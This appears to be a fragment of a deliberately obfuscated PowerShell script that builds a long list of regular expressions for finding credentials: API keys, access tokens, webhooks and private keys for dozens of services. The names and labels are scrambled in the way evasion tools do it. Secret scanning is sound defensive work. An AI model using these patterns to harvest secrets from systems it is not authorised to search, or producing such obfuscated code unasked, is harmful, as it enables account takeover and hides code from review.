  ${rEGEx`S`EArch}.add(("{2}{1}{0}{3}"-f'PI K','ck A','Blo','ey'), "(block[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4})['""]")
  ${ReGe`X`SE`ARCh}.add(("{3}{0}{2}{1}" -f'hain API','Key',' ','Blockc'), "mainnet[a-zA-Z0-9]{32}|testnet[a-zA-Z0-9]{32}|ipfs[a-zA-Z0-9]{32}")
  ${regeXSE`Ar`cH}.add(("{0}{1}{2}{3}"-f 'Blockfrost API',' ','Ke','y'), "(blockchain[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[0-9a-f]{12})['""]")
  ${rEGexs`E`A`RcH}.add(("{1}{0}{2}"-f' API K','Box','ey'), "(box[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9]{32})['""]")
  ${R`EgeXsE`Ar`CH}.add(("{6}{4}{5}{1}{2}{0}{3}"-f'oin API K','ew','c','ey','rav','en','B'), "(bravenewcoin[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{50})['""]")
  ${re`GeXsEAR`Ch}.add(("{4}{1}{0}{2}{3}"-f ' ','t','API K','ey','Clearbi'), "sk_[a-z0-9]{32}")
  ${re`gEXSEA`RcH}.add(("{3}{2}{0}{1}{4}"-f 'j','ars API Ke','o','Cl','y'), "(CLOJARS_)[a-zA-Z0-9]{60}")
  ${Re`g`eXs`EArcH}.add(("{2}{5}{0}{3}{1}{4}"-f 'ase Ac','ss ','Coi','ce','Token','nb'), "([a-z0-9_-]{64})")
  ${Re`G`ExS`EARCh}.add(("{0}{4}{1}{2}{3}" -f 'Coinla','A','PI',' Key','yer '), "(coinlayer[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  ${R`EG`eX`SeArCh}.add(("{0}{4}{1}{3}{2}"-f 'C','I ','y','Ke','oinlib AP'), "(coinlib[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{16})['""]")
  ${REGE`XsEAR`Ch}.add(("{5}{6}{4}{7}{2}{10}{8}{3}{9}{0}{1}" -f'ecre','t Key',' ','s Toke','u','Con','fl','ent','es','n & S','Acc'), "([a-z0-9]{16})")
  ${rEgE`x`SE`ArCH}.add(("{4}{6}{2}{3}{0}{5}{1}" -f'very A','Key','l','i','Contentful','PI ',' de'), "(contentful[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9=_\-]{43})['""]")
  ${REGe`x`SEaR`Ch}.add(("{0}{2}{4}{1}{3}"-f 'C','t API ','o','Key','valen'), "ckey_[a-z0-9]{27}")
  ${REGEXsE`AR`CH}.add(("{1}{4}{2}{0}{3}" -f'I ','C','h AP','Key','harity Searc'), "(charity.?search[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  ${Re`G`eXSeA`RCh}.add(("{3}{4}{2}{1}{0}{5}" -f'Ke',' ','API','Data','bricks ','y'), "dapi[a-h0-9]{32}")
  ${reGE`xse`ARCH}.add(("{1}{0}{2}{3}"-f'ow','DD','nload ','API Key'), "(ddownload[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{22})['""]")
  ${re`GE`X`sEArch}.add(("{1}{6}{7}{0}{2}{3}{5}{4}{8}"-f' N','De','etworki','ng ','I toke','AP','fin','ed','n'), "(dnkey-[a-z0-9=_\-]{26}-[a-z0-9=_\-]{52})")
  ${RE`GE`x`seArCH}.add(("{5}{2}{3}{1}{0}{6}{4}"-f't','& Clien','ey, Clie','nt ID ','ecret','Discord API K',' S'), "((discord[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-h0-9]{64}|[0-9]{18}|[a-z0-9=_\-]{32})['""])")
  ${r`E`gexSeaR`Ch}.add(("{2}{3}{1}{0}" -f 'ken',' Access To','D','roneci'), "([a-z0-9]{32})")
  ${REGEx`s`ea`Rch}.add(("{2}{0}{4}{3}{1}"-f'b','y','Drop',' Ke','ox API'), "sl.[a-zA-Z0-9_-]{136}")
  ${reGexSE`AR`CH}.add(("{2}{4}{1}{0}{3}" -f'er API K','l','Dop','ey','p'), "(dp\.pt\.)[a-zA-Z0-9]{43}")
  ${reGE`Xs`e`Arch}.add(("{7}{4}{11}{9}{0}{1}{3}{8}{12}{2}{6}{10}{5}"-f 'I s','ecr','rt & lo','et/key, s','opbo','Key','ng ','Dr','h',' AP','lived API ','x','o'), "(dropbox[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{15}|sl\.[a-z0-9=_\-]{135}|[a-z0-9]{11}(AAAAAAAAAA)[a-z0-9_=\-]{43})['""]")
  ${REGE`x`seA`RCh}.add(("{0}{2}{1}"-f 'Duffel','API Key',' '), "duffel_(test|live)_[a-zA-Z0-9_-]{43}")
  ${Re`Ge`Xs`EaRCH}.add(("{1}{3}{2}{0}" -f 'PI Key','Dyna','ce A','tra'), "dt0c01\.[a-zA-Z0-9]{24}\.[a-z0-9]{64}")
  ${regE`xsEA`RCh}.add(("{4}{2}{3}{1}{0}" -f'y','e','syPost API',' K','Ea'), "EZAK[a-zA-Z0-9]{54}")
  ${reGEx`Sea`Rch}.add(("{2}{4}{0}{3}{1}"-f 't te',' API Key','Eas','st','yPos'), "EZTK[a-zA-Z0-9]{54}")
  ${RE`GEXSe`Ar`ch}.add(("{4}{2}{5}{1}{0}{3}" -f 'K','PI ','rsca','ey','Ethe','n A'), "(etherscan[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Z0-9]{34})['""]")
  ${rEGEx`sea`RCH}.add(("{0}{3}{2}{1}"-f'Etsy Acc','n','Toke','ess '), "([a-z0-9]{24})")
  ${r`eG`EX`sEaRCh}.add(("{3}{1}{2}{5}{0}{4}" -f'oke','c','ebook Acc','Fa','n','ess T'), ("{6}{0}{3}{1}{2}{5}{4}{7}"-f 'E','BA[0','-','dEose0c','Za-z','9A-','EAAC',']+'))
  ${reGExS`ea`R`cH}.add(("{3}{2}{0}{1}"-f 'I Ke','y','tly AP','Fas'), "(fastly[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9=_\-]{32})['""]")
  ${reGe`xS`ea`RcH}.add(("{0}{3}{4}{5}{2}{1}" -f'Finicit','nt Secret','ie','y API ','Key & ','Cl'), "(finicity[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{32}|[a-z0-9]{20})['""]")
  ${rEgExS`eA`R`ch}.add(("{2}{1}{3}{4}{0}"-f'en','ckr Ac','Fli','cess T','ok'), "([a-z0-9]{32})")
  ${r`e`GeXSearCh}.add(("{1}{3}{2}{0}"-f 'eys','F','weave K','lutter'), "FLWPUBK_TEST-[a-hA-H0-9]{32}-X|FLWSECK_TEST-[a-hA-H0-9]{32}-X|FLWSECK_TEST[a-hA-H0-9]{12}")
  ${RegEXse`A`RcH}.add(("{2}{0}{1}{3}"-f'rame.io',' A','F','PI Key'), "fio-u-[a-zA-Z0-9_=\-]{64}")
  ${Re`gEXS`EARcH}.add(("{5}{0}{4}{2}{3}{1}"-f 'books A','n','o','ke','ccess T','Fresh'), "([a-z0-9]{64})")
  ${ReGeX`sE`A`RCH}.add(("{0}{2}{1}"-f 'Gi','ub','th'), "github(.{0,20})?['""][0-9a-zA-Z]{35,40}")
  ${ReGeXSEa`R`ch}.add(("{2}{3}{4}{0}{1}" -f'o','ken','Git','hub App ','T'), "(ghu|ghs)_[0-9a-zA-Z]{36}")
  ${ReG`EX`searCH}.add(("{5}{2}{0}{1}{4}{6}{7}{3}"-f 'b OAuth',' Access','ithu','n',' T','G','ok','e'), "gho_[0-9a-zA-Z]{36}")
  ${rE`g`exSearCH}.add(("{2}{1}{6}{7}{5}{0}{3}{4}" -f 'e','thu','Gi','ss To','ken','Acc','b Pe','rsonal '), "ghp_[0-9a-zA-Z]{36}")
  ${r`Eg`ExS`EArcH}.add(("{5}{2}{4}{1}{3}{0}{6}" -f 'efresh ','u','t','b R','h','Gi','Token'), "ghr_[0-9a-zA-Z]{76}")
  ${R`e`g`exSeaRch}.add(("{3}{2}{0}{5}{1}{6}{7}{4}"-f 'Hub Fine','e','t','Gi','Access Token','-Grained P','rs','onal '), "github_pat_[0-9a-zA-Z_]{82}")
  ${re`g`ExSe`ARCh}.add(("{8}{0}{5}{7}{1}{4}{2}{6}{3}" -f 'b',' Acce','Tok','n','ss ',' ','e','Personal','Gitla'), "glpat-[0-9a-zA-Z\-]{20}")
  ${ReGE`xSEa`R`ch}.add(("{4}{1}{2}{0}{5}{3}" -f' Trigg',' Pipelin','e','n','GitLab','er Toke'), "glptt-[0-9a-f]{40}")
  ${re`gExs`eaR`CH}.add(("{0}{1}{2}{3}{6}{5}{7}{4}"-f 'GitLab Run','ner Re','gi','str','n','ion ','at','Toke'), "GR1348941[0-9a-zA-Z_\-]{20}")
  ${R`e`GexS`EaRCh}.add(("{0}{2}{4}{1}{5}{3}"-f'Gitte','ss To','r ','n','Acce','ke'), "([a-z0-9_-]{40})")
  ${rEG`e`x`searCH}.add(("{1}{0}{2}{3}{4}"-f 'Cardless ','Go','AP','I K','ey'), "live_[a-zA-Z0-9_=\-]{40}")
  ${rE`GEx`SeA`RCh}.add(("{1}{0}{2}"-f 'e ','GoFil','API Key'), "(gofile[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9]{32})['""]")
  ${R`EGexS`eaRCH}.add(("{0}{1}{2}{3}{4}" -f 'Goo','gle',' AP','I Ke','y'), "AIza[0-9A-Za-z_\-]{35}")
  ${REGEX`s`eaRch}.add(("{5}{4}{7}{3}{6}{2}{0}{1}"-f ' ','Key','rm API',' Pla','gle C','Goo','tfo','loud'), "(google|gcp|youtube|drive|yt)(.{0,20})?['""][AIza[0-9a-z_\-]{35}]['""]")
  ${regEx`S`Ea`RCH}.add(("{3}{1}{0}{2}{4}"-f 'ogl','o','e Drive O','G','auth'), "[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com")
  ${reG`eX`sEArCH}.add(("{0}{5}{1}{4}{3}{2}"-f'Goog','O','oken','cess T','auth Ac','le '), ((("{0}{4}{3}{2}{1}"-f'ya29','a-z_Nsv-]+','Z','v.[0-9A-','Ns'))  -CrePlAce  ([CHar]78+[CHar]115+[CHar]118),[CHar]92))
  ${RE`GeXSE`A`Rch}.add((("{3}{0}{4}{1}{2}{5}{6}"-f'le','CP)',' Se','Goog',' (G','rv','ice-account')), ((("{3}{5}{8}{4}{7}{9}{10}{0}{1}{6}{2}" -f'rvic','e','nt','{0','0}type','}','_accou','.+:.+{','{','0}{0','}se'))-f [cHaR]34))
  ${Re`gEXS`eArCh}.add(("{0}{1}{3}{2}"-f'G','rafa','PI Key','na A'), "eyJrIjoi[a-z0-9_=\-]{72,92}")
  ${re`g`EXsEa`RCH}.add(("{4}{1}{6}{3}{0}{2}{5}"-f 'ud ','an','api toke','lo','Graf','n','a c'), "glc_[A-Za-z0-9\+/]{32,}={0,2}")
  ${RE`G`EXsEa`RCh}.add(("{3}{4}{6}{5}{1}{7}{0}{2}"-f'unt t','a','oken','G','raf','na service ','a','cco'), "(glsa_[A-Za-z0-9]{32}_[A-Fa-f0-9]{8})")
  ${R`E`GE`xseARCH}.add(("{1}{6}{5}{3}{4}{0}{7}{2}"-f 'A','Has','y','Terraform user','/org ','icorp ','h','PI Ke'), "[a-z0-9]{14}\.atlasv1\.[a-z0-9_=\-]{60,70}")
  ${rEG`eXsEA`RCH}.add(("{1}{3}{0}{2}"-f ' Ke','Heroku AP','y','I'), "[hH][eE][rR][oO][kK][uU].{0,30}[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]{12}")
  ${r`eG`eXSEarCH}.add(("{2}{3}{0}{1}" -f'PI',' Key','H','ubspot A'), "['""][a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12}['""]")
  ${r`E`geXSeARcH}.add(("{0}{2}{1}" -f 'Instatus A',' Key','PI'), "(instatus[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  ${r`E`gE`xSEArCh}.add(("{3}{6}{4}{1}{7}{5}{2}{0}" -f'ent Secret/ID','API ','Cli','Int',' ','y & ','ercom','Ke'), "(intercom[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9=_]{60}|[a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12})['""]")
  ${re`Gex`SE`ARch}.add(("{2}{0}{1}"-f'e','y','Ionic API K'), "(ionic[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""](ion_[a-z0-9]{42})['""]")
  ${R`EGExS`Ear`Ch}.add(("{1}{0}{2}{3}{4}" -f'SON We','J','b ','Toke','n'), "(ey[0-9a-z]{30,34}\.ey[0-9a-z\/_\-]{30,}\.[0-9a-zA-Z\/_\-]{10,}={0,2})")
  ${rEGE`x`SEA`RCh}.add(("{2}{0}{5}{1}{3}{4}" -f'n',' ','Krake','To','ken',' Access'), "([a-z0-9\/=_\+\-]{80,90})")
  ${REge`XSea`R`cH}.add(("{4}{0}{3}{2}{5}{1}"-f'o','ken','s','in Acce','Kuc','s To'), "([a-f0-9]{24})")
  ${r`E`g`ExsEArCh}.add(("{2}{0}{1}{4}{3}"-f 'ucoin ','S','K','Key','ecret '), "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
  ${rEGEXs`EA`RcH}.add(("{6}{3}{4}{5}{0}{1}{2}"-f ' Access',' Toke','n','aunch','dark','ly','L'), "([a-z0-9=_\-]{40})")
  ${rEgexS`E`AR`cH}.add(("{4}{0}{1}{2}{3}" -f 'ea','r AP','I Ke','y','Lin'), "(lin_api_[a-zA-Z0-9]{40})")
  ${RE`G`exS`EArch}.add(("{4}{2}{0}{1}{3}{5}" -f're','t/','r Client Sec','I','Linea','D'), "((linear[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-f0-9]{32})['""])")
  ${REg`exse`ArCH}.add(("{2}{0}{3}{1}"-f'inked','n Client ID','L','I'), "linkedin(.{0,20})?['""][0-9a-z]{12}['""]")
  ${rEgexse`A`R`CH}.add(("{3}{5}{6}{0}{2}{1}{4}" -f 'In ',' ','Secret','L','Key','inke','d'), "linkedin(.{0,20})?['""][0-9a-z]{16}['""]")
  ${r`EgeXs`e`ARcH}.add(("{2}{1}{0}"-f'PI Key','A','Lob '), "((lob[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]((live|test)_[a-f0-9]{35})['""])|((lob[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]((test|live)_pub_[a-f0-9]{31})['""])")
  ${Re`gE`XS`earCH}.add(("{2}{5}{0}{1}{3}{4}"-f 'ble ','API ','Lob Pu','Ke','y','blisha'), "((test|live)_pub_[a-f0-9]{31})")
  ${Rege`xSeA`RCH}.add(("{0}{3}{2}{4}{1}" -f'Ma','or','lboxValid','i','at'), "(mailbox.?validator[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Z0-9]{20})['""]")
  ${R`e`gexseARCh}.add(("{2}{1}{0}{3}"-f 'e','lchimp API K','Mai','y'), "[0-9a-f]{32}-us[0-9]{1,2}")
  ${r`e`Gexse`Arch}.add(("{2}{4}{3}{0}{1}"-f 'un A','PI Key','M','g','ail'), "key-[0-9a-zA-Z]{32}'")
  ${rEGex`sea`R`cH}.add(("{1}{5}{2}{4}{3}{6}{0}"-f' Key','Mailg','bl','alid','ic V','un Pu','ation'), "pubkey-[a-f0-9]{32}")
  ${re`gexSe`A`Rch}.add(("{1}{8}{6}{3}{7}{0}{4}{5}{2}" -f 'ok','M','y','un',' signi','ng ke','ilg',' Webho','a'), "[a-h0-9]{32}-[a-h0-9]{8}-[a-h0-9]{8}")
  ${rEg`E`xSe`ArCH}.add(("{3}{4}{1}{2}{0}"-f 'Key','x',' API ','Ma','pbo'), "(pk\.[a-z0-9]{60}\.[a-z0-9]{22})")
  ${r`egExSeA`RCH}.add(("{2}{1}{0}{4}{3}"-f'ces','rmost Ac','Matte',' Token','s'), "([a-z0-9]{26})")
  ${r`EGexS`EARCH}.add(("{5}{6}{7}{0}{1}{3}{4}{2}"-f 'PI Key',' ','t ID','& API cli','en','MessageB','ird',' A'), "(messagebird[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{25}|[a-h0-9]{8}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{4}-[a-h0-9]{12})['""]")
  ${ReG`Ex`SeAR`ch}.add(("{4}{1}{0}{2}{5}{3}"-f'roso','c','ft ',' Webhook','Mi','Teams'), "https:\/\/[a-z0-9]+\.webhook\.office\.com\/webhookb2\/[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}@[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}\/IncomingWebhook\/[a-z0-9]{32}\/[a-z0-9]{8}-([a-z0-9]{4}-){3}[a-z0-9]{12}")
  ${r`EG`eXseaR`ch}.add(("{0}{2}{1}{3}" -f 'MojoAuth','I K',' AP','ey'), "[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}")
  ${Reg`Exs`Ea`RCH}.add(("{2}{3}{0}{4}{1}{5}" -f's','ok','Netlify A','cce','s T','en'), "([a-z0-9=_\-]{40,46})")
  ${RegeX`SEaR`CH}.add(("{15}{1}{5}{11}{2}{14}{0}{10}{8}{9}{13}{6}{7}{3}{4}{12}" -f 'er API Ke','w',' ','I',' ID & Ingest',' Reli','r A','P','U','s','y, ','c',' Browser API Key','e','Us','Ne'), "(NRAK-[A-Z0-9]{27})|((newrelic[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Z0-9]{64})['""])|(NRJS-[a-f0-9]{19})")
  ${ReGE`X`seArcH}.add(("{2}{0}{1}"-f 'd','es','Nowno'), "(nownodes[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([A-Za-z0-9]{32})['""]")
  ${rEgEX`SEA`RCh}.add(("{1}{2}{0}{3}{4}" -f'ess','Npm',' Acc',' T','oken'), "(npm_[a-zA-Z0-9]{36})")
  ${r`Eg`E`xSeARCH}.add(("{2}{3}{0}{1}" -f 'ss Toke','n','Nytim','es Acce'), "([a-z0-9=_\-]{32})")
  ${rEGEX`SE`A`RcH}.add(("{3}{2}{1}{0}{4}"-f 's Toke',' Acces','a','Okt','n'), "([a-z0-9=_\-]{42})")
  ${R`EGe`XsEArCh}.add(("{3}{1}{0}{2}"-f ' API Tok','penAI','en','O'), "sk-[A-Za-z0-9]{48}")
  ${r`EGeXsEA`R`cH}.add(("{2}{5}{1}{4}{0}{3}{6}" -f'e Ac','Intellige','O','cess Ke','nc','RB ','y'), "['""][a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}['""]")
  ${rEG`e`xS`earcH}.add(("{3}{1}{2}{0}"-f'ey',' ','API K','Pastebin'), "(pastebin[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{32})['""]")
  ${r`eg`EXsE`ARch}.add(("{5}{1}{3}{4}{0}{2}"-f'c','P','ess Token','al ','Braintree Ac','Pay'), 'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}')
  ${r`eG`ex`sEarcH}.add(("{1}{2}{4}{0}{3}"-f 'at','P','i','ic API Key','c'), "sk_live_[0-9a-z]{32}")
  ${Re`geXse`Ar`ch}.add(("{0}{3}{2}{1}" -f 'Pinat','ey','PI K','a A'), "(pinata[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{64})['""]")
  ${ReGE`xSEa`Rch}.add(("{2}{1}{5}{6}{0}{4}{3}" -f ' A','a','Pl',' Key','PI','netsc','ale'), "pscale_tkn_[a-zA-Z0-9_\.\-]{43}")
  ${rEgEx`sEAR`ch}.add(("{1}{0}{3}{2}"-f'netSca','Pla','en','le OAuth tok'), "(pscale_oauth_[a-zA-Z0-9_\.\-]{32,64})")
  ${R`EgE`xSE`ArCh}.add(("{0}{4}{3}{2}{1}"-f 'Plane','assword',' P','cale','ts'), "pscale_pw_[a-zA-Z0-9_\.\-]{43}")
  ${rEg`e`XsEAr`Ch}.add(("{1}{4}{2}{3}{0}" -f'ken','P','d',' API To','lai'), "(access-(?:sandbox|development|production)-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
  ${Reg`eXsea`R`ch}.add(("{2}{3}{0}{1}"-f 'd Cl','ient ID','Pla','i'), "([a-z0-9]{24})")
  ${r`eg`EXs`eARcH}.add(("{2}{1}{3}{0}" -f'ey','aid Se','Pl','cret k'), "([a-z0-9]{30})")
  ${rEGexSE`A`Rch}.add(("{3}{2}{1}{0}" -f 'oken','I t','AP','Prefect '), "(pnu_[a-z0-9]{36})")
  ${reGex`se`A`RCh}.add(("{3}{2}{1}{0}"-f 'API Key',' ','n','Postma'), "PMAK-[a-fA-F0-9]{24}-[a-fA-F0-9]{34}")
  ${RE`gExs`EarCh}.add(("{0}{1}{2}"-f 'P','rivate',' Keys'), ((("{23}{42}{36}{18}{14}{1}{50}{61}{7}{51}{43}{56}{25}{46}{10}{52}{26}{17}{62}{20}{47}{48}{30}{24}{45}{3}{33}{34}{13}{59}{58}{32}{9}{4}{2}{15}{27}{44}{0}{57}{41}{35}{22}{38}{55}{16}{28}{31}{29}{12}{60}{8}{19}{37}{40}{21}{49}{5}{39}{54}{11}{53}{6}" -f'{0}-','TE KEY','GIN PGP PRIVATE ','RIVATE KEY{0}-','{0}-{0}-BE','EY{','-{0}-','}','BEGIN','0}-{1}{0}-{0}-{0}-','-{0','}-{0}-{0','-','}-{0}','A','KEY BLOCK{0}-{0}-{0','0}-{','-{0}-{0}-{0','V',' EC ','{0}-{','IV',' PRIVATE KE','{0}-{','IN ','{0}-{0}','SA PRIVATE KEY{0}-{0}','}-','0}-{1}{0}-{0}-','-{0}','G','{0}','{','{','0','{0}-{0}-{0}-{0}-BEGIN DSA','0}-BEGIN PRI','P','Y{0}-{0}-','0}-{','R','}-','0}-{0}-{0}-{','{','{0}-','OPENSSH P','-{0}','0}-{0}-{0}-{0}-','BE','ATE K','{0}-{0}-{','-{0}-{0}-','}-BEGIN R','}','0','{0}-{','1}{0}-','{1}{0','-','-{0}','{0}-','0','}-{1}'))  -F [char]92,[char]124))
  ${REgeXs`E`ARch}.add(("{1}{0}{4}{3}{2}"-f'lumi API ','Pu','y','e','K'), "pul-[a-f0-9]{40}")
  ${RegeXSE`A`RCH}.add(("{2}{3}{0}{1}" -f 'a','d token','PyPI',' uplo'), "pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_\-]{50,}")
  ${rEge`xsEa`RCh}.add(("{0}{1}{2}" -f 'Quip ','API K','ey'), "(quip[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-zA-Z0-9]{15}=\|[0-9]{10}\|[a-zA-Z0-9\/+]{43}=)['""]")
  ${rEG`exseA`RCh}.add(("{3}{0}{2}{1}"-f'pidAPI','s Token',' Acces','Ra'), "([a-z0-9_-]{50})")
  ${R`eGExse`A`RcH}.add(("{1}{3}{0}{2}" -f 'PI Ke','Rubyg','y','em A'), "rubygems_[a-f0-9]{48}")
  ${r`egexS`EARCh}.add(("{5}{1}{2}{0}{3}{4}"-f' to','eadme AP','I','ke','n','R'), "rdme_[a-z0-9]{70}")
  ${Re`GeX`S`EARCH}.add(("{0}{1}{4}{2}{3}"-f'Se','n','ess ','ID','dbird Acc'), "([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
  ${re`GExSe`Ar`Ch}.add(("{3}{0}{2}{1}"-f 'ccess','n',' Toke','Sendbird A'), "([a-f0-9]{40})")
  ${re`gE`xSeARch}.add(("{0}{5}{3}{4}{1}{2}" -f 'S',' AP','I Key','dgri','d','en'), "SG\.[a-zA-Z0-9_\.\-]{66}")
  ${R`e`gexSe`ArCh}.add(("{4}{5}{3}{2}{0}{1}"-f 'API ','Key','e ','inblu','Se','nd'), "xkeysib-[a-f0-9]{64}-[a-zA-Z0-9]{16}")
  ${ReGex`sE`ARCh}.add(("{3}{1}{5}{4}{2}{0}" -f 'en','n','k','Se','ss To','try Acce'), "([a-f0-9]{64})")
  ${REGe`xS`eArcH}.add(("{0}{6}{7}{5}{11}{12}{4}{15}{14}{9}{17}{3}{16}{10}{1}{13}{8}{2}" -f 'Shippo ','n & S','cret','en, Pr',', Custo','cess T','API K','ey, Ac','ed Se','c','ke','o','ken','har',' A','m','ivate App Access To','cess Tok'), "shippo_(live|test)_[a-f0-9]{40}|shpat_[a-fA-F0-9]{32}|shpca_[a-fA-F0-9]{32}|shppa_[a-fA-F0-9]{32}|shpss_[a-fA-F0-9]{32}")
  ${REGe`xs`e`ArCH}.add(("{2}{0}{1}{3}"-f 'ecr','e','Sidekiq S','t'), "([a-f0-9]{8}:[a-f0-9]{8})")
  ${rEGexs`ea`R`Ch}.add(("{0}{1}{2}{5}{4}{3}" -f'Sid','ekiq S','e','URL','ve ','nsiti'), "([a-f0-9]{8}:[a-f0-9]{8})@(?:gems.contribsys.com|enterprise.contribsys.com)")
  ${r`Eg`E`XSEaRcH}.add(("{1}{2}{0}"-f 'en','Slack ','Tok'), "xox[baprs]-([0-9a-zA-Z]{10,48})?")
  ${Reg`EXSE`ArCH}.add(("{2}{1}{3}{0}" -f 'hook','lack We','S','b'), "https://hooks.slack.com/services/T[a-zA-Z0-9_]{10}/B[a-zA-Z0-9_]{10}/[a-zA-Z0-9_]{24}")
  ${reg`EX`SeA`Rch}.add(("{0}{3}{2}{1}"-f 'Smarksh','ey','l API K','ee'), "(smartsheet[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{26})['""]")
  ${REg`ExSE`A`RCh}.add(("{3}{2}{1}{4}{0}"-f 'ken','Access ','e ','Squar','To'), "sqOatp-[0-9A-Za-z_\-]{22}")
  ${R`EgEXseAr`ch}.add(("{2}{0}{4}{3}{1}" -f 'uar','y','Sq',' API Ke','e'), "EAAAE[a-zA-Z0-9_-]{59}")
  ${REGEXS`EA`RCH}.add(("{0}{3}{4}{2}{1}"-f'Squar','ret','Sec','e O','auth '), "sq0csp-[ 0-9A-Za-z_\-]{43}")
  ${R`EgE`xSe`ARCH}.add(("{2}{0}{3}{1}"-f 'c','API Key','Styt','h '), "secret-.*-[a-zA-Z0-9_=\-]{36}")
  ${rEGe`X`sEAR`Ch}.add(("{0}{2}{5}{4}{1}{3}"-f'S','Token & ','t','API Key','s ','ripe Acces'), "(sk|pk)_(test|live)_[0-9a-z]{10,32}|k_live_[0-9a-zA-Z]{24}")
  ${rEgEX`SE`A`RCh}.add(("{2}{1}{5}{4}{0}{3}"-f 'ces','Logi','Sumo','s ID',' Ac','c'), "([a-z0-9]{14})")
  ${r`eg`ExS`EaRch}.add(("{5}{1}{2}{0}{4}{3}" -f'ss','g','ic Acce','en',' Tok','SumoLo'), "([a-z0-9]{64})")
  ${RegEXSeA`R`CH}.add(("{4}{3}{1}{0}{2}"-f'Tok','Bot API ','en','m ','Telegra'), "[0-9]+:AA[0-9A-Za-z\\-_]{33}")
  ${Re`GExSe`Ar`Ch}.add(("{4}{0}{1}{2}{3}"-f'vis CI Acce','s','s Tok','en','Tra'), "([a-z0-9]{22})")
  ${r`EGe`XSEARcH}.add(("{2}{0}{1}"-f ' ','Key','Trello API'), "(trello[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([0-9a-z]{32})['""]")
  ${ReGEx`Se`ARch}.add(("{0}{1}{3}{2}"-f 'T','wili',' API Key','o'), "SK[0-9a-fA-F]{32}")
  ${reg`eXSeAr`ch}.add(("{1}{2}{0}"-f' Key','Twi','tch API'), "(twitch[a-z0-9_ \.,\-]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['""]([a-z0-9]{30})['""]")
  ${rE`GEXsea`RCh}.add(("{1}{3}{2}{0}"-f 'ID','Twitt','nt ','er Clie'), "[tT][wW][iI][tT][tT][eE][rR](.{0,20})?['""][0-9a-z]{18,25}")
